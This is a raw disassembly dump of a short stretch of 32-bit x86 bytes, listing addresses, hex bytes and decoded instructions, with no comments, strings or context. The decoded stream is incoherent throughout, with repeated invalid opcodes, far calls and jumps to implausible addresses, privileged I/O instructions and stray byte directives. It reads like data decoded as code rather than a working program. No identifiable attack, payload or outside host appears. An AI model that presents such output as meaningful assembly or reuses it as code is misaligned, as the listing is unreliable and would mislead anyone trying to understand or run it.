  4021d4:	58                   	pop    %eax
  4021d5:	00 55 0c             	add    %dl,0xc(%ebp)
  4021d8:	57                   	push   %edi
  4021d9:	0c a7                	or     $0xa7,%al
  4021db:	54                   	push   %esp
  4021dc:	de 91 2c db e3 b6    	ficoms -0x491c24d4(%ecx)
  4021e2:	a9 6e e3 cd 21       	test   $0x21cde36e,%eax
  4021e7:	9c                   	pushf
  4021e8:	73 d6                	jae    0x4021c0
  4021ea:	ae                   	scas   %es:(%edi),%al
  4021eb:	c4 4f eb             	les    -0x15(%edi),%ecx
  4021ee:	bf 7e 49 9b e8       	mov    $0xe89b497e,%edi
  4021f3:	8b 01                	mov    (%ecx),%eax
  4021f5:	e8 fb 46 ff eb       	call   0xec3f68f5
  4021fa:	52                   	push   %edx
  4021fb:	1f                   	pop    %ds
  4021fc:	1e                   	push   %ds
  4021fd:	b9 ff 17 0a ff       	mov    $0xff0a17ff,%ecx
  402202:	ff                   	(bad)
  402203:	ff a8 46 f8 e1 01    	ljmp   *0x1e1f846(%eax)
  402209:	07                   	pop    %es
  40220a:	51                   	push   %ecx
  40220b:	80 d6 e8             	adc    $0xe8,%dh
  40220e:	00 8c 5a 74 cb db 9e 	add    %cl,-0x6124348c(%edx,%ebx,2)
  402215:	3d 8b d0 01 e8       	cmp    $0xe801d08b,%eax
  40221a:	ce                   	into
  40221b:	46                   	inc    %esi
  40221c:	ff c7                	inc    %edi
  40221e:	64 fe                	fs (bad)
  402220:	72 41                	jb     0x402263
  402222:	17                   	pop    %ss
  402223:	41                   	inc    %ecx
  402224:	be e8 ca bf f2       	mov    $0xf2bfcae8,%esi
  402229:	af                   	scas   %es:(%edi),%eax
  40222a:	3e 37                	ds aaa
  40222c:	c0 00 54             	rolb   $0x54,(%eax)
  40222f:	e4 2a                	in     $0x2a,%al
  402231:	05 c5 23 89 80       	add    $0x808923c5,%eax
  402236:	c1 78 87 98          	sarl   $0x98,-0x79(%eax)
  40223a:	0f 5b cb             	cvtdq2ps %xmm3,%xmm1
  40223d:	4e                   	dec    %esi
  40223e:	2c f2                	sub    $0xf2,%al
  402240:	48                   	dec    %eax
  402241:	01 18                	add    %ebx,(%eax)
  402243:	b0 be                	mov    $0xbe,%al
  402245:	f9                   	stc
  402246:	cc                   	int3
  402247:	40                   	inc    %eax
  402248:	0b b9 24 dc 7e ff    	or     -0x8123dc(%ecx),%edi
  40224e:	ff                   	(bad)
  40224f:	ff                   	(bad)
  402250:	ef                   	out    %eax,(%dx)
  402251:	48                   	dec    %eax
  402252:	f3 c3                	repz ret
  402254:	09 5d 0e             	or     %ebx,0xe(%ebp)
  402257:	07                   	pop    %es
  402258:	09 b9 51 b6 6e ff    	or     %edi,-0x9149af(%ecx)
  40225e:	ff                   	(bad)
  40225f:	ff a5 17 80 7a ff    	jmp    *-0x857fe9(%ebp)
  402265:	7f 62                	jg     0x4022c9
  402267:	2d 51 95 9e 3c       	sub    $0x3c9e9551,%eax
  40226c:	91                   	xchg   %eax,%ecx
  40226d:	a0 f4 39 a7 c8       	mov    0xc8a739f4,%al
  402272:	c1 51 01 48          	rcll   $0x48,0x1(%ecx)
  402276:	54                   	push   %esp
  402277:	89 8a 76 48 00 01    	mov    %ecx,0x1004876(%edx)
  40227d:	48                   	dec    %eax
  40227e:	76 91                	jbe    0x402211
  402280:	92                   	xchg   %eax,%edx
  402281:	54                   	push   %esp
  402282:	48                   	dec    %eax
  402283:	00 01                	add    %al,(%ecx)
  402285:	48                   	dec    %eax
  402286:	54                   	push   %esp
  402287:	99                   	cltd
  402288:	9a 70 48 00 01 48 70 	lcall  $0x7048,$0x1004870
  40228f:	a1 a2 34 48 00       	mov    0x4834a2,%eax
  402294:	01 48 34             	add    %ecx,0x34(%eax)
  402297:	a9 aa 70 48 00       	test   $0x4870aa,%eax
  40229c:	01 48 70             	add    %ecx,0x70(%eax)
  40229f:	b1 b2                	mov    $0xb2,%cl
  4022a1:	34 48                	xor    $0x48,%al
  4022a3:	00 01                	add    %al,(%ecx)
  4022a5:	48                   	dec    %eax
  4022a6:	34 b9                	xor    $0xb9,%al
  4022a8:	8c b5 11 c3 a2 da    	mov    %?,-0x255d3cef(%ebp)
  4022ae:	bc c7 4d 09 91       	mov    $0x91094dc7,%esp
  4022b3:	88 f8                	mov    %bh,%al
  4022b5:	12 74 00 8c          	adc    -0x74(%eax,%eax,1),%dh
  4022b9:	7d 54                	jge    0x40230f
  4022bb:	8a 85 21 7b 20 42    	mov    0x42207b21(%ebp),%al
  4022c1:	fe                   	(bad)
  4022c2:	74 ff                	je     0x4022c3
  4022c4:	01 61 3b             	add    %esp,0x3b(%ecx)
  4022c7:	88 60 95             	mov    %ah,-0x6b(%eax)
  4022ca:	5d                   	pop    %ebp
  4022cb:	8b 52 b7             	mov    -0x49(%edx),%edx
  4022ce:	20 b3 c0 30 db 88    	and    %dh,-0x7724cf40(%ebx)
  4022d4:	01 38                	add    %edi,(%eax)
  4022d6:	45                   	inc    %ebp
  4022d7:	8b 0d 00 3b af a9    	mov    0xa9af3b00,%ecx
  4022dd:	13 59 5c             	adc    0x5c(%ecx),%ebx
  4022e0:	dc a1 b3 f1 4d cb    	fsubl  -0x34b20e4d(%ecx)
  4022e6:	f8                   	clc
  4022e7:	8b 01                	mov    (%ecx),%eax
  4022e9:	48                   	dec    %eax
  4022ea:	b1 ac                	mov    $0xac,%cl
  4022ec:	61                   	popa
  4022ed:	a9 c3 f8 76 87       	test   $0x8776f8c3,%eax
  4022f2:	9d                   	popf
  4022f3:	20 05 bd 0c e9 c6    	and    %al,0xc6e90cbd
  4022f9:	18 00                	sbb    %al,(%eax)
  4022fb:	00 01                	add    %al,(%ecx)
  4022fd:	8b 68 8d             	mov    -0x73(%eax),%ebp
  402300:	7e 18                	jle    0x40231a
  402302:	8b 00                	mov    (%eax),%eax
  402304:	0d 00 3b ae a9       	or     $0xa9ae3b00,%eax
  402309:	13 8d 00 b5 02 41    	adc    0x4102b500(%ebp),%ecx
  40230f:	05 dc ce 04 40       	add    $0x4004cedc,%eax
  402314:	0c 2e                	or     $0x2e,%al
  402316:	ab                   	stos   %eax,%es:(%edi)
  402317:	2a b8 64 a5 f3 90    	sub    -0x6f0c5a9c(%eax),%bh
  40231d:	40                   	inc    %eax
  40231e:	2c 79                	sub    $0x79,%al
  402320:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402321:	4c                   	dec    %esp
  402322:	c1 63 cd 83          	shll   $0x83,-0x33(%ebx)
  402326:	60                   	pusha
  402327:	c3                   	ret
  402328:	69 24 00 20 01 31 d2 	imul   $0xd2310120,(%eax,%eax,1),%esp
  40232f:	02 6b 9c             	add    -0x64(%ebx),%ch
  402332:	3b ff                	cmp    %edi,%edi
  402334:	a9 14 e1 d8 8d       	test   $0x8dd8e114,%eax
  402339:	d8 e3                	fsub   %st(3),%st
  40233b:	00 60 74             	add    %ah,0x74(%eax)
  40233e:	17                   	pop    %ss
  40233f:	70 39                	jo     0x40237a
  402341:	47                   	inc    %edi
  402342:	cb                   	lret
  402343:	08 b0 c0 c3 1c 01    	or     %dh,0x11cc3c0(%eax)
  402349:	c0 05 4b b5 84 46 54 	rolb   $0x54,0x4684b54b
  402350:	00 b9 54 4c be 95    	add    %bh,-0x6a41b3ac(%ecx)
  402356:	8a b6 b1 8a 95 9d    	mov    -0x626a754f(%esi),%dh
  40235c:	9a 91 db 51 03 24 4d 	lcall  $0x4d24,$0x351db91
  402363:	f5                   	cmc
  402364:	51                   	push   %ecx
  402365:	95                   	xchg   %eax,%ebp
  402366:	61                   	popa
  402367:	c3                   	ret
  402368:	a2 ea 49 54 f2       	mov    %al,0xf25449ea
  40236d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40236e:	1a 8a ac e9 79 cc    	sbb    -0x33861654(%edx),%cl
  402374:	24 00                	and    $0x0,%al
  402376:	86 c6                	xchg   %al,%dh
  402378:	fd                   	std
  402379:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40237a:	8b 1c 70             	mov    (%eax,%esi,2),%ebx
  40237d:	01 2d 25 d4 30 61    	add    %ebp,0x6130d425
  402383:	86 44 14 50          	xchg   %al,0x50(%esp,%edx,1)
  402387:	02 ce                	add    %dh,%cl
  402389:	29 26                	sub    %esp,(%esi)
  40238b:	7a bf                	jp     0x40234c
  40238d:	52                   	push   %edx
  40238e:	3c 46                	cmp    $0x46,%al
  402390:	e9 eb 00 04 01       	jmp    0x1442480
  402395:	5a                   	pop    %edx
  402396:	e8 18 f4 fb 71       	call   0x723c17b3
  40239b:	c8 f4 5e a0          	enter  $0x5ef4,$0xa0
  40239f:	76 7b                	jbe    0x40241c
  4023a1:	5b                   	pop    %ebx
  4023a2:	00 67 58             	add    %ah,0x58(%edi)
  4023a5:	08 5f 26             	or     %bl,0x26(%edi)
  4023a8:	65 00 f8             	gs add %bh,%al
  4023ab:	ca bc 88             	lret   $0x88bc
  4023ae:	f1                   	int1
  4023af:	1d 40 65 3e b6       	sbb    $0xb63e6540,%eax
  4023b4:	99                   	cltd
  4023b5:	98                   	cwtl
  4023b6:	4b                   	dec    %ebx
  4023b7:	e6 ed                	out    %al,$0xed
  4023b9:	61                   	popa
  4023ba:	4a                   	dec    %edx
  4023bb:	3b a5 81 8a 6f 01    	cmp    0x16f8a81(%ebp),%esp
  4023c1:	68 60 ab 1b 74       	push   $0x741bab60
  4023c6:	2e 08 0d 43 07 04 12 	or     %cl,%cs:0x12040743
  4023cd:	27                   	daa
  4023ce:	92                   	xchg   %eax,%edx
  4023cf:	3d 50 7a 94 16       	cmp    $0x16947a50,%eax
  4023d4:	7c 94                	jl     0x40236a
  4023d6:	7a 51                	jp     0x402429
  4023d8:	54                   	push   %esp
  4023d9:	7a 94                	jp     0x40236f
  4023db:	7c 3a                	jl     0x402417
  4023dd:	aa                   	stos   %al,%es:(%edi)
  4023de:	85 68 02             	test   %ebp,0x2(%eax)
  4023e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4023e2:	1e                   	push   %ds
  4023e3:	2b 0f                	sub    (%edi),%ecx
  4023e5:	12 19                	adc    (%ecx),%bl
  4023e7:	19 03                	sbb    %eax,(%ebx)
  4023e9:	23 36                	and    (%esi),%esi
  4023eb:	97                   	xchg   %eax,%edi
  4023ec:	a9 58 d7 b6 c9       	test   $0xc9b6d758,%eax
  4023f1:	08 f8                	or     %bh,%al
  4023f3:	05 05 9a cb 66       	add    $0x66cb9a05,%eax
  4023f8:	62 16                	bound  %edx,(%esi)
  4023fa:	95                   	xchg   %eax,%ebp
  4023fb:	01 58 a7             	add    %ebx,-0x59(%eax)
  4023fe:	06                   	push   %es
  4023ff:	53                   	push   %ebx
  402400:	05 3a 5f 5a bf       	add    $0xbf5a5f3a,%eax
  402405:	21 6a 50             	and    %ebp,0x50(%edx)
  402408:	01 8b 1a cc a6 fb    	add    %ecx,-0x45933e6(%ebx)
  40240e:	99                   	cltd
  40240f:	00 01                	add    %al,(%ecx)
  402411:	12 ad 86 5d 99 a4    	adc    -0x5b66a27a(%ebp),%ch
  402417:	47                   	inc    %edi
  402418:	cb                   	lret
  402419:	62 58 d4             	bound  %ebx,-0x2c(%eax)
  40241c:	f2 52                	repnz push %edx
  40241e:	76 e3                	jbe    0x402403
  402420:	c3                   	ret
  402421:	e8 52 ce 74 01       	call   0x1b4f278
  402426:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402427:	ff 58 a7             	lcall  *-0x59(%eax)
  40242a:	29 07                	sub    %eax,(%edi)
  40242c:	c9                   	leave
  40242d:	e2 9b                	loop   0x4023ca
  40242f:	54                   	push   %esp
  402430:	58                   	pop    %eax
  402431:	12 34 e4             	adc    (%esp,%eiz,8),%dh
  402434:	77 55                	ja     0x40248b
  402436:	d0 ff                	sar    %bh
  402438:	5e                   	pop    %esi
  402439:	8d 45 ee             	lea    -0x12(%ebp),%eax
  40243c:	f4                   	hlt
  40243d:	85 89 d4 cc 20 d0    	test   %ecx,-0x2fdf332c(%ecx)
  402443:	de 5c 10 24          	ficomps 0x24(%eax,%edx,1)
  402447:	44                   	inc    %esp
  402448:	01 00                	add    %eax,(%eax)
  40244a:	00 68 69             	add    %ch,0x69(%eax)
  40244d:	00 00                	add    %al,(%eax)
  40244f:	00 c4                	add    %al,%ah
  402451:	66 33 f6             	xor    %si,%si
  402454:	91                   	xchg   %eax,%ecx
  402455:	89 2b                	mov    %ebp,(%ebx)
  402457:	99                   	cltd
  402458:	3d e0 dc 55 e2       	cmp    $0xe255dce0,%eax
  40245d:	12 a5 e7 6e 0a 64    	adc    0x640a6ee7(%ebp),%ah
  402463:	d0 01                	rolb   (%ecx)
  402465:	fb                   	sti
  402466:	ef                   	out    %eax,(%dx)
  402467:	63 d2                	arpl   %dx,%dx
  402469:	13 6f ff             	adc    -0x1(%edi),%ebp
  40246c:	89 75 75             	mov    %esi,0x75(%ebp)
  40246f:	28 4d ed             	sub    %cl,-0x13(%ebp)
  402472:	4b                   	dec    %ebx
  402473:	25 16 37 52 24       	and    $0x24523716,%eax
  402478:	79 99                	jns    0x402413
  40247a:	eb 76                	jmp    0x4024f2
  40247c:	e2 13                	loop   0x402491
  40247e:	4d                   	dec    %ebp
  40247f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402480:	91                   	xchg   %eax,%ecx
  402481:	d3 bc 91 6d 0b 4b 55 	sarl   %cl,0x554b0b6d(%ecx,%edx,4)
  402488:	71 7a                	jno    0x402504
  40248a:	29 dc                	sub    %ebx,%esp
  40248c:	c3                   	ret
  40248d:	2b 01                	sub    (%ecx),%eax
  40248f:	b6 21                	mov    $0x21,%dh
  402491:	ff 99 f0 4f 24 94    	lcall  *-0x6bdbb010(%ecx)
  402497:	88 6f 00             	mov    %ch,0x0(%edi)
  40249a:	7d 9b                	jge    0x402437
  40249c:	11 00                	adc    %eax,(%eax)
  40249e:	3f                   	aas
  40249f:	6e                   	outsb  %ds:(%esi),(%dx)
  4024a0:	6b a8 55 10 9c a5 7e 	imul   $0x7e,-0x5a63efab(%eax),%ebp
  4024a7:	ec                   	in     (%dx),%al
  4024a8:	e9 80 f0 8b 8c       	jmp    0x8ccc152d
  4024ad:	fc                   	cld
  4024ae:	69 00 06 68 fc dc    	imul   $0xdcfc6806,(%eax),%eax
  4024b4:	03 ff                	add    %edi,%edi
  4024b6:	55                   	push   %ebp
  4024b7:	21 4b 55             	and    %ecx,0x55(%ebx)
  4024ba:	97                   	xchg   %eax,%edi
  4024bb:	d3 81 68 00 00 6e    	roll   %cl,0x6e000068(%ecx)
  4024c1:	6a 00                	push   $0x0
  4024c3:	6a 68                	push   $0x68
  4024c5:	68 6a 03 01 80       	push   $0x8001036a
  4024ca:	3f                   	aas
  4024cb:	fe                   	(bad)
  4024cc:	a9 73 01 c4 c1       	test   $0xc1c40173,%eax
  4024d1:	80 24 55 c4 90 59 fb 	andb   $0x2e,-0x4a66f3c(,%edx,2)
  4024d8:	2e 
  4024d9:	a3 44 61 c0 5e       	mov    %eax,0x5ec06144
  4024de:	c7                   	(bad)
  4024df:	d4 4a                	aam    $0x4a
  4024e1:	71 32                	jno    0x402515
  4024e3:	ce                   	into
  4024e4:	62 65 76             	bound  %esp,0x76(%ebp)
  4024e7:	d4 1e                	aam    $0x1e
  4024e9:	1b 51 84             	sbb    -0x7c(%ecx),%edx
  4024ec:	2b 6d 52             	sub    0x52(%ebp),%ebp
  4024ef:	5f                   	pop    %edi
  4024f0:	c5 92 5d bc b3 27    	lds    0x27b3bc5d(%edx),%edx
  4024f6:	4e                   	dec    %esi
  4024f7:	87 49 6e             	xchg   %ecx,0x6e(%ecx)
  4024fa:	b8 25 d4 fb ad       	mov    $0xadfbd425,%eax
  4024ff:	79 b5                	jns    0x4024b6
  402501:	93                   	xchg   %eax,%ebx
  402502:	11 36                	adc    %esi,(%esi)
  402504:	2c 8f                	sub    $0x8f,%al
  402506:	92                   	xchg   %eax,%edx
  402507:	8d b0 64 c5 8e a3    	lea    -0x5c713a9c(%eax),%esi
  40250d:	3a ee                	cmp    %dh,%ch
  40250f:	3f                   	aas
  402510:	14 a6                	adc    $0xa6,%al
  402512:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402513:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402514:	8d a7 08 e3 2a c5    	lea    -0x3ad51cf8(%edi),%esp
  40251a:	04 d7                	add    $0xd7,%al
  40251c:	7b bd                	jnp    0x4024db
  40251e:	1e                   	push   %ds
  40251f:	f8                   	clc
  402520:	87 93 02 26 01 00    	xchg   %edx,0x12602(%ebx)
  402526:	00 b7 01 00 00 00    	add    %dh,0x1(%edi)
  40252c:	01 00                	add    %eax,(%eax)
  40252e:	00 00                	add    %al,(%eax)
  402530:	01 00                	add    %eax,(%eax)
  402532:	00 00                	add    %al,(%eax)
  402534:	01 00                	add    %eax,(%eax)
  402536:	00 00                	add    %al,(%eax)
  402538:	01 00                	add    %eax,(%eax)
  40253a:	00 00                	add    %al,(%eax)
  40253c:	01 b2 90 00 01 90    	add    %esi,-0x6ffeff70(%edx)
  402542:	92                   	xchg   %eax,%edx
  402543:	05 04 20 04 00       	add    $0x42004,%eax
  402548:	01 87 7b 34 27 7b    	add    %eax,0x7b27347b(%edi)
  40254e:	83 00 a8             	addl   $0xffffffa8,(%eax)
  402551:	48                   	dec    %eax
  402552:	f5                   	cmc
  402553:	f7 52 f4             	notl   -0xc(%edx)
  402556:	fe                   	(bad)
  402557:	7c 35                	jl     0x40258e
  402559:	de e1                	fsubp  %st,%st(1)
  40255b:	08 e7                	or     %ah,%bh
  40255d:	0d 8e 0d ad 77       	or     $0x77ad0d8e,%eax
  402562:	8b 31                	mov    (%ecx),%esi
  402564:	59                   	pop    %ecx
  402565:	ca b5 b9             	lret   $0xb9b5
  402568:	27                   	daa
  402569:	a9 b0 bd 4f 86       	test   $0x864fbdb0,%eax
  40256e:	4d                   	dec    %ebp
  40256f:	97                   	xchg   %eax,%edi
  402570:	bd                   	.byte 0xbd
  402571:	1a                   	.byte 0x1a
  402572:	80                   	.byte 0x80
  402573:	b1                   	.byte 0xb1
